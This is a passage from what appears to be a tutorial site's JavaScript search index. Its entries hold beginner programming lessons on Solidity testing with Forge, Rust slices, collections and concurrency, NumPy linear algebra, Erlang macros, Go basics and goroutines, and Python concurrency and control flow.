                content: "Unit testing is a critical part of the development process, ensuring that your smart contracts behave as expected. In this section, we will explore how to write unit tests in Solidity using the Forge testing framework. We will start by understanding the concept of AAA (Arrange, Act, Assert) and then dive into a practical example.\nUnderstanding AAA (Arrange, Act, Assert) linkThe AAA pattern is a standard approach in unit testing that ensures tests are well-structured and easy to understand. It consists of three main steps:\nArrange: Set up the necessary preconditions and inputs. Act: Perform the action that you want to test. Assert: Verify that the action had the expected outcome. This pattern helps in creating clear and maintainable tests. Let’s see how this applies to Solidity testing with Forge.\nExample: Testing a Counter Contract linkWe will test a simple Counter contract (we have already covered this contracy in the introduction) that allows setting a number and incrementing it. Here is the Counter contract:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; contract Counter { uint256 public number; function setNumber(uint256 newNumber) public { number = newNumber; } function increment() public { number++; } } Writing Unit Tests for the Counter Contract linkNow, let’s write unit tests for the Counter contract using the AAA pattern.\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import {Test, console} from \"forge-std/Test.sol\"; import {Counter} from \"../src/Counter.sol\"; contract CounterTest is Test { Counter public counter; // Setting up the initial state of the contract once deployed function setUp() public { counter = new Counter(); counter.setNumber(0); } // Act and Assert: Increment the counter and check the result function test_Increment() public { // Act counter.increment(); // Assert assertEq(counter.number(), 1); } // Act and Assert: Set the number to a specific value and verify function testFuzz_SetNumber(uint256 x) public { // Act counter.setNumber(x); // Assert assertEq(counter.number(), x); } } Explanation of the Test Code linkSince this is not a complete contract, and we are using it to get to understand how to write unit tests, some functions will be simple and will not need all three AAA concepts.\nWe will started on with the imports:\nimport {Test, console} from \"forge-std/Test.sol\"; import {Counter} from \"../src/Counter.sol\"; contract CounterTest is Test { We are importing two contraccts: the Counter contract which we will be testing and the Test contract which will help us test these contract and provide us with utility functions.\nThe setUp function is used to initialize the Counter contract and set the number to 0. This function runs before each test, ensuring a clean state.\n`test_Increment:\nAct: The counter.increment() function is called to increment the number. Assert: The assertEq(counter.number(), 1) statement checks if the number is incremented to 1. If true, the tests will pass, else they will fail. (testFuzz_SetNumber):\nAct: The counter.setNumber(x) function sets the number to a random value x. Assert: The assertEq(counter.number(), x) statement verifies that the number is set correctly to x. Running the Tests linkTo run the tests, use the Forge framework. Ensure that you have Forge installed and set up. You can run the tests using the following command:\nforge test Forge will execute the tests and provide feedback on whether they pass or fail.\nConclusion linkUnit testing in Solidity is crucial for developing reliable smart contracts. Using the AAA pattern helps in structuring tests clearly and effectively. In this blog, we demonstrated how to write unit tests for a simple Counter contract using Forge. By following the AAA pattern, you can create well-structured and maintainable tests for your smart contracts.\n"
            }
        );
    index.add(
            {
                id:  153 ,
                href: "\/tutorials\/docs\/rust\/rust\/leveraging_slices_rust\/",
                title: "Leveraging the Power of Slices in Rust",
                description: "Explore the versatile and efficient slice type in Rust, learning how to utilize string slices and other applications to manage data segments without ownership, featuring detailed technical insights and practical coding examples.",
                content: "Introduction linkSlices are a powerful feature in Rust that provide a way to reference a contiguous sequence of elements in a collection rather than the whole collection. This post will explore slices in-depth, focusing on their definition, applications, and particularly how they are used with strings to perform operations on parts of a string efficiently and safely.\nUnderstanding Slices linkA slice is a two-word object, the first word is a pointer to the data, and the second word is the length of the slice. Slices let you reference a contiguous sequence of elements in a collection without taking ownership of them, which allows for efficient access and manipulation of subsets of data.\nBasic Example of a Slice:\nlet arr = [1, 2, 3, 4, 5]; let slice_of_arr = \u0026arr[1..4]; // This slice includes elements at indices 1, 2, and 3. This slice slice_of_arr now refers to a portion of arr without owning it. The original array remains unchanged and unowned by the slice.\nApplications of Slices linkSlices are particularly useful when you want to pass parts of a collection to functions without copying the entire collection. They are used extensively in handling strings, arrays, and other collections.\nUsing Slices in Functions:\nfn analyze_slice(slice: \u0026[i32]) { println!(\"The first element of the slice: {}\", slice[0]); println!(\"The slice has {} elements\", slice.len()); } let arr = [1, 2, 3, 4, 5]; analyze_slice(\u0026arr[1..4]); // Passing a slice of arr to the function This function analyze_slice takes a slice of an array and can perform operations without ever owning the entire array.\nWorking with String Slices linkString slices are a specific type of slice that reference a portion of a String. They are extremely useful for reading parts of strings without needing to clone or copy the entire string.\nExample of String Slices:\nlet s = String::from(\"Hello world\"); let hello = \u0026s[0..5]; let world = \u0026s[6..11]; println!(\"{} {}\", hello, world); // Outputs: Hello world This example demonstrates how to create slices from a String, allowing for efficient access to subsections of the string.\nTechnical Insights into String Slices linkString slices are critical in Rust because they enforce memory safety and data integrity by preventing modifications and ensuring that the slice does not outlive the string it references.\nSafety with String Slices:\nYou cannot have a mutable reference to a String and an immutable string slice at the same time. Rust’s borrow checker ensures that string slices do not outlive the string they reference, thus avoiding dangling references. Common Errors and Solutions: Trying to create a slice that does not lie on character boundaries in a String can cause runtime errors. Rust protects against this by ensuring that slices align with valid UTF-8 character boundaries.\nlet s = String::from(\"Здравствуйте\"); let slice = \u0026s[0..4]; // Correct: 'Зд' is a valid UTF-8 sequence println!(\"Slice: {}\", slice); This correctly slices the first two Cyrillic characters, respecting UTF-8 encoding rules.\nConclusion linkSlices in Rust are a versatile tool for managing data efficiently. They allow programs to handle partial data without the cost of duplication, reinforcing Rust’s principles of safety and efficiency. As we’ve seen, they are particularly useful in string manipulation, which is a common requirement in many programs.\n"
            }
        );
    index.add(
            {
                id:  154 ,
                href: "\/tutorials\/docs\/numpy\/numpy\/linear_algebra\/",
                title: "Linear Algebra with NumPy",
                description: "...",
                content: "Introduction link Importance of Linear Algebra: Linear algebra is fundamental in various fields such as data science, machine learning, computer graphics, and more. NumPy provides efficient tools for performing linear algebra operations. Overview of NumPy’s Capabilities: NumPy’s linalg module offers a wide range of functions to perform operations like matrix multiplication, solving linear systems, calculating determinants, eigenvalues, and more. 1. Matrix Creation link1.1 Creating Matrices\nimport numpy as np # Creating a 2x2 matrix A = np.array([[1, 2], [3, 4]]) print(\"Matrix A:\\n\", A) 1.2 Creating Identity Matrices\n# Identity matrix of size 3x3 I = np.eye(3) print(\"Identity Matrix I:\\n\", I) 1.3 Creating Diagonal Matrices\n# Diagonal matrix with specified diagonal elements D = np.diag([1, 2, 3]) print(\"Diagonal Matrix D:\\n\", D) 2. Matrix Operations link2.1 Matrix Multiplication\n# Matrix multiplication using @ operator or dot() function B = np.array([[5, 6], [7, 8]]) C = A @ B print(\"Matrix Multiplication A @ B:\\n\", C) C_dot = np.dot(A, B) print(\"Matrix Multiplication using dot() function:\\n\", C_dot) 2.2 Element-wise Multiplication\n# Element-wise multiplication using * operator C_elementwise = A * B print(\"Element-wise Multiplication A * B:\\n\", C_elementwise) 3. Determinants link3.1 Calculating Determinants\n# Determinant of a matrix det_A = np.linalg.det(A) print(\"Determinant of A:\", det_A) Applications of Determinants\nDeterminants can be used to determine if a matrix is invertible (non-zero determinant). They are also used in calculating the area or volume of geometric shapes. 4. Eigenvalues and Eigenvectors link4.1 Finding Eigenvalues and Eigenvectors\n# Eigenvalues and eigenvectors of a matrix eigenvalues, eigenvectors = np.linalg.eig(A) print(\"Eigenvalues of A:\", eigenvalues) print(\"Eigenvectors of A:\\n\", eigenvectors) Applications of Eigenvalues and Eigenvectors\nUsed in Principal Component Analysis (PCA) for dimensionality reduction. Important in solving differential equations and stability analysis. 5. Solving Linear Systems link5.1 Solving Linear Equations\n# Solving the system of linear equations Ax = b b = np.array([5, 6]) x = np.linalg.solve(A, b) print(\"Solution x of the system Ax = b:\", x) Example Problem\nGiven the equations: ( x + 2y = 5 ) ( 3x + 4y = 6 ) Represented in matrix form as: ( A = \\begin{bmatrix} 1 \u0026 2 \\ 3 \u0026 4 \\end{bmatrix}, b = \\begin{bmatrix} 5 \\ 6 \\end{bmatrix} ) Solving for ( x ) using np.linalg.solve(A, b). 6. Matrix Inversion link6.1 Calculating the Inverse of a Matrix\n# Inverse of a matrix inv_A = np.linalg.inv(A) print(\"Inverse of A:\\n\", inv_A) Applications of Matrix Inversion\nUsed in solving linear systems (alternative method). Important in finding solutions to matrix equations. Considerations for Matrix Inversion\nNot all matrices are invertible (must have a non-zero determinant). Inverse of large matrices can be computationally expensive. Examples and Applications link Data Science and Machine Learning: Linear regression, PCA, and other algorithms often rely on linear algebra operations. Computer Graphics: Transformations and projections use matrix multiplications. Engineering: Systems of equations are solved using these methods. Conclusion link Summary of Key Concepts: Reviewed matrix creation, multiplication, determinants, eigenvalues, solving linear systems, and inversion. Additional Resources: NumPy documentation: NumPy Linear Algebra Textbooks and online courses on linear algebra and its applications. This tutorial provides a comprehensive overview of essential linear algebra operations using NumPy, along with practical examples and applications. Each section includes code snippets to illustrate the concepts and demonstrates how these operations are used in various fields.\n"
            }
        );
    index.add(
            {
                id:  155 ,
                href: "\/tutorials\/docs\/erlang\/erlang\/macros_in_erlang\/",
                title: "Macros in Erlang Programming Language",
                description: "Macros in Erlang provide a powerful way to define constants and reusable code snippets that can be expanded inline during compilation. This tutorial will guide you through understanding, defining, and using macros in Erlang, along with some best practices to keep your code clean and maintainable.\nIntroduction to Macros linkMacros in Erlang are a form of syntactic sugar that allows developers to define constants or code snippets that can be substituted during the pre-processing phase of compilation.",
                content: "Macros in Erlang provide a powerful way to define constants and reusable code snippets that can be expanded inline during compilation. This tutorial will guide you through understanding, defining, and using macros in Erlang, along with some best practices to keep your code clean and maintainable.\nIntroduction to Macros linkMacros in Erlang are a form of syntactic sugar that allows developers to define constants or code snippets that can be substituted during the pre-processing phase of compilation. Macros can be particularly useful for defining:\nConstants Reusable code blocks Conditional compilation directives Macros are defined using the -define directive and can be referenced using the ? prefix.\nDefining Macros linkMacros in Erlang are defined using the -define directive. Here are the steps to define a simple macro:\nSyntax link -define(MACRO_NAME, ReplacementValue). Example link -define(PI, 3.14159). -define(MESSAGE, \"Hello, Erlang!\"). In this example, PI and MESSAGE are macros that will be replaced with 3.14159 and \"Hello, Erlang!\" respectively during compilation.\nUsing Macros linkOnce defined, macros can be used in the code by prefixing their names with a question mark (?).\nExample link -module(example). -export([area_of_circle/1, greet/0]). -define(PI, 3.14159). -define(MESSAGE, \"Hello, Erlang!\"). area_of_circle(Radius) -\u003e ?PI * Radius * Radius. greet() -\u003e io:format(\"?MESSAGE~n\"). In this example, the area_of_circle/1 function uses the ?PI macro to calculate the area of a circle, and the greet/0 function prints the ?MESSAGE macro.\nParameterized Macros linkErlang also supports parameterized macros, which allow macros to accept arguments.\nSyntax link -define(MACRO_NAME(Arg1, Arg2), ReplacementValue). Example link -define(SQUARE(X), (X) * (X)). This macro SQUARE takes one argument X and returns its square.\nUsage link -module(parameterized_example). -export([square_of_5/0]). -define(SQUARE(X), (X) * (X)). square_of_5() -\u003e ?SQUARE(5). The square_of_5/0 function uses the ?SQUARE macro to calculate the square of 5.\nConditional Compilation linkErlang macros can also be used for conditional compilation, enabling or disabling parts of the code based on certain conditions.\nSyntax link -if(CONDITION). % Code to include if CONDITION is true -else. % Code to include if CONDITION is false -endif. Example link -module(conditional_example). -export([log/1]). -define(DEBUG, true). -if(?DEBUG). log(Message) -\u003e io:format(\"DEBUG: ~p~n\", [Message]). -else. log(_Message) -\u003e ok. -endif. In this example, the log/1 function will print debug messages if the DEBUG macro is set to true. Otherwise, it does nothing.\nBest Practices linkWhen using macros, consider the following best practices:\nNaming Conventions: Use uppercase names for macros to distinguish them from regular variables. Documentation: Document macros clearly, especially if they are parameterized or used for conditional compilation. Scope: Keep the scope of macros limited to the module where they are defined to avoid naming conflicts and improve code readability. Avoid Overuse: Use macros judiciously to avoid making the code harder to read and debug. Example Code linkHere’s a comprehensive example that uses various types of macros:\n-module(macro_example). -export([main/0, area_of_circle/1, greet/0, square_of_5/0, log/1]). % Define simple macros -define(PI, 3.14159). -define(MESSAGE, \"Hello, Erlang!\"). % Define a parameterized macro -define(SQUARE(X), (X) * (X)). % Conditional compilation macro -define(DEBUG, true). area_of_circle(Radius) -\u003e ?PI * Radius * Radius. greet() -\u003e io:format(\"?MESSAGE~n\"). square_of_5() -\u003e ?SQUARE(5). -if(?DEBUG). log(Message) -\u003e io:format(\"DEBUG: ~p~n\", [Message]). -else. log(_Message) -\u003e ok. -endif. main() -\u003e Radius = 5, io:format(\"Area of circle with radius ~p: ~p~n\", [Radius, area_of_circle(Radius)]), greet(), io:format(\"Square of 5: ~p~n\", [square_of_5()]), log(\"This is a debug message\"). Conclusion linkMacros in Erlang are a powerful tool for defining constants, reusable code snippets, and controlling compilation conditions. By following best practices, you can use macros to write cleaner, more maintainable code. Experiment with the examples provided and see how macros can simplify your Erlang programming experience.\n"
            }
        );
    index.add(
            {
                id:  156 ,
                href: "\/tutorials\/docs\/golang\/golang\/understanding-go-basics\/",
                title: "Master the Basics of Go",
                description: "Unlock the fundamentals of Go programming with an in-depth look at its data types, variables, constants, basic operators, and control structures including if, else, switch, and loops.",
                content: "Introduction:\nWelcome back to your Go programming journey! As you start to feel more comfortable with the basics of Go, it’s crucial to dive deeper into the core components that you will use in almost every Go program you write. This blog explores Go’s data types, variables, constants, basic operators, and control structures, providing a comprehensive guide to help you master the foundational concepts. Understanding these basics will enable you to write more efficient and effective Go code. So, let’s get started!\n1. Data Types, Variables, and Constants\na. Data Types:\nGo is statically typed, which means the type of a variable is known at compile time. Here are the basic data types you’ll frequently encounter in Go:\nIntegers: Signed and unsigned integers with various capacities (int8, int16, int32, int64, uint8, etc.). Floats: Floating-point numbers are represented by float32 and float64. Boolean: Represents true or false values. String: A sequence of characters with immutable nature. Complex types: Complex64 and complex128 for complex numbers (useful in scientific computing). b. Variables:\nVariables in Go are created using the var keyword, but you can also use the shorthand := that infers the type based on the assigned value:\nvar name string = \"Go Programmer\" age := 25 // type inferred as int c. Constants:\nConstants are essentially variables whose values cannot be changed after their definition. Use the const keyword to define them:\nconst Pi = 3.14159 Constants can be character, string, boolean, or numeric values and do not use the := syntax.\n2. Basic Operators and Expressions\nOperators in Go are special symbols or phrases that are used to check, change, or combine values. Here are the categories of operators you need to know:\na. Arithmetic Operators:\n+ (addition), - (subtraction), * (multiplication), / (division), % (modulus) b. Comparison Operators:\n== (equal to), != (not equal), \u003c (less than), \u003e (greater than), \u003c= (less or equal), \u003e= (greater or equal) c. Logical Operators:\n\u0026\u0026 (logical and), || (logical or), ! (logical not) d. Assignment Operators:\n= (simple assignment), +=, -=, *=, /=, %= (modify and assign) e. Other Operators:\n\u0026 (address of), * (pointer dereference) 3. Control Structures: If, Else, Switch, Loops\nControl structures direct the flow of your program. Let’s break down the most commonly used:\na. If and Else:\nThe if statement specifies a block of code to be executed if a condition is true:\nif temperature \u003e 30 { fmt.Println(\"It's hot outside!\") } else { fmt.Println(\"It's not that hot today.\") } b. Switch:\nA switch statement simplifies multiple if checks and provides a more elegant way to handle multiple conditions:\nswitch day { case \"Monday\": fmt.Println(\"Start of the work week.\") case \"Saturday\", \"Sunday\": fmt.Println(\"Weekend time!\") default: fmt.Println(\"It's a weekday.\") } c. Loops:\nGo has only one looping construct, the for loop. It can act as a traditional for-loop or while-loop:\n// traditional for-loop for i := 0; i \u003c 10; i++ { fmt.Println(i) } // while-style loop j := 0 for j \u003c 10 { fmt.Println(j) j++ } Conclusion:\nNow that you’ve got a solid foundation in Go’s data types, variables, constants, operators, and control structures, you’re well on your way to becoming proficient in Go programming. These basic elements are the building blocks of any Go program, and mastering them will greatly enhance your ability to write robust and maintainable code. Keep practicing what you’ve learned here, and stay tuned for more advanced Go tutorials!\nNow, if you are interested in upskilling in 2024 with AI development, check out this 6 AI advanced projects with Go where you learng about building with AI and getting the best knowledge there is currently. Here’s the link\nFrequently Asked Questions:\nQ: Why does Go not have a while loop? A: Go simplifies the looping constructs by only having\na for loop, which can be used in several ways to achieve the same functionality as a while loop, thereby keeping the language specification simpler.\nQ: Can constants be declared using the := syntax in Go? A: No, constants in Go must be declared using the const keyword. The := syntax is reserved for declaring variables.\nQ: Is Go garbage collected? A: Yes, Go is a garbage-collected language, which means it automatically handles the allocation and deallocation of memory, making it easier to manage memory safely and effectively.\nFeel free to explore more about Go and experiment with different code snippets to deepen your understanding. Happy coding!\n"
            }
        );
    index.add(
            {
                id:  157 ,
                href: "\/tutorials\/docs\/rust\/rust\/collections-rust\/",
                title: "Mastering Collections in Rust: Vectors, HashMaps, and HashSets",
                description: "Delve deep into Rust's collections framework in this comprehensive guide, exploring the intricacies of Vectors, HashMaps, and HashSets. Learn how to utilize these collections effectively to build more efficient and robust Rust applications. This post is packed with technical insights, practical coding examples, and best practices tailored for advanced Rust developers.",
                content: "Introduction linkCollections are fundamental for storing and managing groups of data. Rust provides several powerful collections including Vectors, HashMaps, and HashSets, each designed for different use cases and efficiency considerations. This post explores these collections in-depth, providing insights into their mechanisms and demonstrating effective ways to use them in Rust programming.\nUnderstanding Common Collections link Vector (Vec)\nVectors in Rust are resizable arrays. Like arrays, vectors store their contents in contiguous memory, but can dynamically grow and shrink as elements are added or removed. Creating and Using a Vector: let mut vec = Vec::new(); vec.push(1); vec.push(2); vec.push(3); println!(\"{:?}\", vec); // Outputs: [1, 2, 3] Vectors are ideal for scenarios where you need to dynamically store a list of items, and you frequently access elements by index or iterate over the elements. HashMap\nHashMaps store data based on key-value pairs and provide fast retrieval of data by using a hash function to compute an index from the keys. Creating and Using a HashMap: use std::collections::HashMap; let mut scores = HashMap::new(); scores.insert(\"Blue\", 10); scores.insert(\"Yellow\", 50); HashMaps are used for lookups, insertions, and deletions of data keyed by unique identifiers, making them essential for performance-critical applications that involve large datasets. HashSet\nA HashSet is a collection of unique items. It is implemented with hash tables the same way as HashMap, except that it only stores unique keys without any associated values. Creating and Using a HashSet: use std::collections::HashSet; let mut books = HashSet::new(); books.insert(\"1984\"); books.insert(\"The Hobbit\"); books.insert(\"1984\"); // This will not be added again, as HashSet items must be unique println!(\"{:?}\", books.contains(\"1984\")); // Outputs: true HashSet is particularly useful for quickly checking membership, ensuring uniqueness, and performing set operations like union and intersection. Using Collections Effectively link Choosing the Right Collection:\nUse Vec when you need a dynamic list or buffer, and you are interested in pushing and popping items frequently. Use HashMap for key-value pair based data storage and when quick lookup and insertion are necessary. Use HashSet when you need to ensure that all elements are unique and you require fast membership testing. Performance Considerations:\nVectors provide efficient access to elements by index and have good locality of reference, which is beneficial for performance. HashMaps and HashSets can be slower for small datasets due to hashing overhead, but they are extremely efficient for large datasets where direct indexing is impractical. Memory Usage:\nUnderstand the memory overhead of each collection. For example, HashMaps and HashSets typically consume more memory than Vectors because of the hashing mechanism. Iterating Over Collections:\nRust provides powerful iteration capabilities. Use iterator methods like iter, into_iter, and iter_mut to respectively borrow, take ownership, or mutably borrow each element in the collection. Conclusion linkUnderstanding and using Rust’s collections effectively is crucial for developing efficient and maintainable applications. Each collection type—Vector, HashMap, and HashSet—serves distinct purposes and offers different performance trade-offs. By mastering these collections, Rust developers can optimize data management tasks and enhance the performance and reliability of their applications.\n"
            }
        );
    index.add(
            {
                id:  158 ,
                href: "\/tutorials\/docs\/python\/python\/python_concurrency_and_parallelism\/",
                title: "Mastering Concurrency and Parallelism in Python: Threading, Multiprocessing, and Asyncio",
                description: "Explore the concepts of concurrency and parallelism in Python with an in-depth look at threading, multiprocessing, and the asyncio module. Learn how to effectively handle asynchronous and parallel tasks to optimize performance and efficiency in your applications.",
                content: "Introduction linkConcurrency and parallelism are key concepts for developing high-performance applications. Python provides several modules that enable concurrent and parallel execution of code. We’ll discuss three primary methods: threading, multiprocessing, and asyncio.\nThreading linkThreading is a technique for achieving concurrency. In Python, threads allow you to run multiple operations concurrently in the same process space.\nBasic Threading link import threading def print_cube(num): \"\"\"Function to print cube of given num\"\"\" print(\"Cube: {}\".format(num * num * num)) def print_square(num): \"\"\"Function to print square of given num\"\"\" print(\"Square: {}\".format(num * num)) # Creating thread objects t1 = threading.Thread(target=print_square, args=(10,)) t2 = threading.Thread(target=print_cube, args=(10,)) # Starting threads t1.start() t2.start() # Waiting for both threads to complete t1.join() t2.join() print(\"Done!\") In this example, two threads t1 and t2 run concurrently, which allows print_square and print_cube to execute simultaneously.\nMultiprocessing linkMultiprocessing is used for spreading tasks over multiple processors, aiming to achieve parallelism (simultaneous execution).\nBasic Multiprocessing link from multiprocessing import Process, current_process def worker(): \"\"\"Worker function\"\"\" print('Worker:', current_process().name) if __name__ == '__main__': # Number of CPUs num_cpus = 4 processes = [] for i in range(num_cpus): process = Process(target=worker) processes.append(process) process.start() for process in processes: process.join() print(\"Processing complete!\") This example shows how to create and run multiple processes. By using the Process class from multiprocessing, we can execute the function worker concurrently on multiple CPUs.\nAsyncio Module linkasyncio is used for writing concurrent code using the async/await syntax.\nUsing Asyncio link import asyncio async def count_to_ten(): \"\"\"Asynchronously count to ten\"\"\" for i in range(1, 11): print(i) await asyncio.sleep(1) # Simulate an I/O operation async def main(): await count_to_ten() # Running the coroutine asyncio.run(main()) Here, count_to_ten is an asynchronous function that counts from 1 to 10, pausing for a second between numbers using await asyncio.sleep(1), which mimics a blocking I/O operation. asyncio.run(main()) is used to run the main coroutine that drives the count_to_ten coroutine.\nConclusion linkConcurrency and parallelism are powerful strategies for optimizing performance in Python applications. By understanding and utilizing threading, multiprocessing, and asyncio, you can significantly improve the efficiency of your code, especially in I/O-bound and CPU-bound operations. This guide provides a comprehensive overview of these methods, showing you how to implement them in real-world scenarios.\n"
            }
        );
    index.add(
            {
                id:  159 ,
                href: "\/tutorials\/docs\/golang\/golang\/concurrency-in-go-routines\/",
                title: "Mastering Concurrency in Go with Goroutines",
                description: "Unlock the power of asynchronous programming in Go with our comprehensive guide on goroutines. Learn best practices for managing concurrency effectively in your Go applications.",
                content: "Introduction:\nWelcome to the exciting world of concurrency in Go! In the realm of software development, the ability to execute multiple operations simultaneously can drastically enhance the performance and responsiveness of applications. Go provides a powerful yet simple way to handle concurrency through goroutines, which are functions or methods that run concurrently with other functions or methods. In this blog, we’ll dive into the essentials of concurrency, explore how to use goroutines for asynchronous programming, and share best practices for managing these lightweight threads effectively.\n1. Introduction to Concurrency\nConcurrency refers to the ability of a program to manage multiple tasks at the same time. Unlike parallelism, where tasks physically run at the same time on multiple processors, concurrency is about dealing with lots of tasks at once but not necessarily performing them at the same time. This can involve multitasking within a single application or handling multiple requests to a server.\nIn Go, concurrency is implemented with goroutines, which are more efficient than traditional threads. They require less memory overhead; typically, a few kilobytes of stack space, and the stack can grow and shrink according to needs of the task.\n2. Using Goroutines for Asynchronous Programming\na. Creating Goroutines:\nGoroutines are created simply by placing the keyword go before a function call. This tells Go to run the function concurrently, rather than waiting for it to complete before moving on to the next function.\nfunc sayHello() { fmt.Println(\"Hello!\") } func main() { go sayHello() // main function will continue to execute and may terminate before sayHello() starts } b. Synchronization:\nSince goroutines run asynchronously, synchronization mechanisms are needed to coordinate their work. The sync package provides useful tools, including Mutex and WaitGroup, for handling synchronization.\nvar wg sync.WaitGroup func worker(id int) { defer wg.Done() fmt.Printf(\"Worker %d starting\\n\", id) time.Sleep(time.Second) fmt.Printf(\"Worker %d done\\n\", id) } func main() { for i := 1; i \u003c= 5; i++ { wg.Add(1) go worker(i) } wg.Wait() // Wait for all goroutines to finish } 3. Best Practices for Managing Goroutines\na. Avoiding Goroutine Leaks:\nA goroutine leak occurs when a goroutine is launched but never terminates. To prevent this, always ensure that goroutines exit after their task is done or when no longer needed.\nb. Managing Goroutine Lifecycles:\nIt’s important to manage the lifecycle of each goroutine, ensuring they are not orphaned or running indefinitely. Using context packages for managing cancellations and timeouts can help control goroutines’ behavior.\nc. Handling Errors in Goroutines:\nSince goroutines run concurrently, managing errors can be challenging. Utilize channels or the errgroup package to propagate errors to the main goroutine where they can be handled appropriately.\nd. Using Buffered Channels:\nChannels are used to communicate between goroutines. Buffered channels are particularly useful when you know how many goroutines you need to synchronize, as they allow sending without an immediate receiver.\nch := make(chan string, 2) ch \u003c- \"First\" ch \u003c- \"Second\" fmt.Println(\u003c-ch) fmt.Println(\u003c-ch) Conclusion:\nGoroutines are a cornerstone of concurrent programming in Go, allowing developers to create applications that are highly responsive and efficient. By understanding how to properly manage and synchronize goroutines, you can take full advantage of their potential to improve the performance of your Go applications. Remember, concurrency is not just about making things faster; it’s about designing smarter, more robust applications.\nNow, if you are interested in upskilling in 2024 with AI development, check out this 6 AI advanced projects with Go where you learng about building with AI and getting the best knowledge there is currently. Here’s the link\nFrequently Asked Questions:\nQ: How many goroutines can I start? A: Theoretically, you can start as many goroutines as your system’s memory will allow, but it’s best to limit the number to what is actually needed for optimal application performance.\nQ: Can goroutines run in parallel? A: Yes, if your Go program is running on a multi-core processor, the Go runtime can schedule goroutines to run in parallel.\nQ: How do I choose between using a channel or WaitGroup for synchronization? A: Use channels when goroutines need to communicate with each other, and use WaitGroups when you just need to wait for a set of goroutines to complete.\n"
            }
        );
    index.add(
            {
                id:  160 ,
                href: "\/tutorials\/docs\/rust\/rust\/concurrency_rust\/",
                title: "Mastering Concurrency in Rust",
                description: "Unlock the power of safe concurrency in Rust with this in-depth exploration of threading, parallelism, and Rust's ownership-based approach to concurrency safety. This detailed guide provides technical insights, practical coding examples, and best practices to effectively utilize concurrency in Rust applications.",
                content: "Introduction linkConcurrency is a core strength of Rust, enabling efficient execution of multiple tasks simultaneously in a safe and predictable manner. This post delves into the mechanisms Rust provides for handling concurrency, including threading, data sharing strategies, and Rust’s guarantees for safe concurrent programming.\nBasic Threading and Parallelism linkRust provides several tools for creating threads and managing parallel execution, allowing developers to harness the power of modern multi-core processors effectively.\nCreating Threads:\nRust’s standard library includes the thread module, which allows you to spawn new threads. use std::thread; use std::time::Duration; fn main() { let handle = thread::spawn(|| { for i in 1..10 { println!(\"hi number {} from the spawned thread!\", i); thread::sleep(Duration::from_millis(1)); } }); for i in 1..5 { println!(\"hi number {} from the main thread!\", i); thread::sleep(Duration::from_millis(1)); } handle.join().unwrap(); } This example demonstrates spawning a new thread and using join to ensure that all threads complete their execution before the main thread exits. Using Thread Pools:\nFor managing a large number of threads for various tasks, Rust can use thread pools. While not part of the standard library, the rayon crate is a popular choice that provides a work-stealing thread pool. use rayon::prelude::*; fn main() { let results: Vec\u003c_\u003e = (0..1000).into_par_iter().map(|i| i * i).collect(); println!(\"{:?}\", results); } Safe Concurrency with Rust linkOne of Rust’s most notable features is its ability to enforce memory safety without needing a garbage collector. Rust’s ownership, borrowing, and lifetime rules extend into concurrency, preventing data races at compile time.\nOwnership and Threads:\nRust ensures that only data with a static lifetime is used across threads unless explicitly managed. use std::thread; fn main() { let v = vec![1, 2, 3]; let handle = thread::spawn(move || { println!(\"Here's a vector: {:?}\", v); }); handle.join().unwrap(); } This code moves v into the closure with move, making it explicitly owned by the thread. Using Mutexes and Channels:\nRust provides several synchronization primitives like Mutex and channels that help manage state across threads safely. Mutex: use std::sync::{Arc, Mutex}; use std::thread; fn main() { let counter = Arc::new(Mutex::new(0)); let mut handles = vec![]; for _ in 0..10 { let counter = Arc::clone(\u0026counter); let handle = thread::spawn(move || { let mut num = counter.lock().unwrap(); *num += 1; }); handles.push(handle); } for handle in handles { handle.join().unwrap(); } println!(\"Result: {}\", *counter.lock().unwrap()); } Channel: use std::sync::mpsc; use std::thread; fn main() { let (tx, rx) = mpsc::channel(); thread::spawn(move || { let val = String::from(\"hello\"); tx.send(val).unwrap(); }); let received = rx.recv().unwrap(); println!(\"Got: {}\", received); } Conclusion linkMastering concurrency in Rust not only boosts the performance of applications but also significantly enhances their reliability and safety. By leveraging Rust’s powerful concurrency features and its strict compile-time checks, developers can build robust multi-threaded applications that are free from common concurrency problems like data races and deadlocks.\n"
            }
        );
    index.add(
            {
                id:  161 ,
                href: "\/tutorials\/docs\/python\/python\/python_control_structures\/",
                title: "Mastering Control Structures in Python: If Statements, Loops, and More",
                description: "Unlock the power of Python's control structures to guide your program's decisions and repetitive tasks. This guide provides a deep dive into if statements, for loops, and while loops with practical examples.",
                content: "Introduction linkControl structures are essential in programming, allowing developers to direct the flow of execution based on conditions or by repeating operations. In Python, the primary control structures are conditional statements and loops. This section will explore these structures, provide detailed code explanations, and demonstrate their use in practical scenarios.\nIf Statements linkIf statements allow for conditional execution of code segments, enabling decisions within the program based on certain conditions.\nSyntax and Explanation: link if condition: # Execute if condition is true elif another_condition: # Execute if the first condition is false and this condition is true else: # Execute if all previous conditions were false Detailed Example: link temperature = 75 if temperature \u003e 80: print(\"It's too hot!\") elif 65 \u003c= temperature \u003c= 80: print(\"The weather is perfect!\") else: print(\"It might be too cold!\") This example checks the temperature and prints a message based on the temperature range. The elif allows for additional checks if the initial if condition fails, and else covers all other conditions that do not meet the if or elif conditions.\nFor Loops linkFor loops are ideal for iterating over a sequence (like a list, tuple, or string), performing an operation for each item in the sequence.\nSyntax and Explanation: link for element in sequence: # Execute for each item in sequence Detailed Example: link # Printing all prime numbers within a range for num in range(10, 20): for i in range(2, num): if num % i == 0: j = num / i print(f'{num} equals {i} * {j}') break else: print(num, 'is a prime number') This nested loop checks for prime numbers between 10 and 20. The inner loop checks if num can be evenly divided by any number between 2 and itself. The else associated with the for loop executes if the loop completes without encountering a break, indicating the number is prime.\nWhile Loops linkWhile loops repeatedly execute as long as the given boolean condition remains true, making them suitable for situations where the number of iterations is not predetermined.\nSyntax and Explanation: link while condition: # Execute repeatedly while condition is true Detailed Example: link # Guessing game import random number = random.randint(1, 10) # Random number between 1 and 10 guess = None while guess != number: guess = int(input('Guess a number between 1 and 10: ')) if guess \u003c number: print('Too low!') elif guess \u003e number: print('Too high!') print('Congratulations! You guessed it right!') This code creates a simple number guessing game where the user must guess a randomly generated number. The loop continues until the correct number is guessed, with feedback provided on each guess.\nNested Loops and Conditional Statements linkCombining loops and conditional statements can address more complex programming tasks by providing multiple layers of iteration and decision-making.\nExample: link # Creating a multiplication table for values from 1 to 5 for i in range(1, 6): for j in range(1, 6): print(f'{i} * {j} = {i * j}') print(\"End of table for\", i) This example uses nested loops to generate a 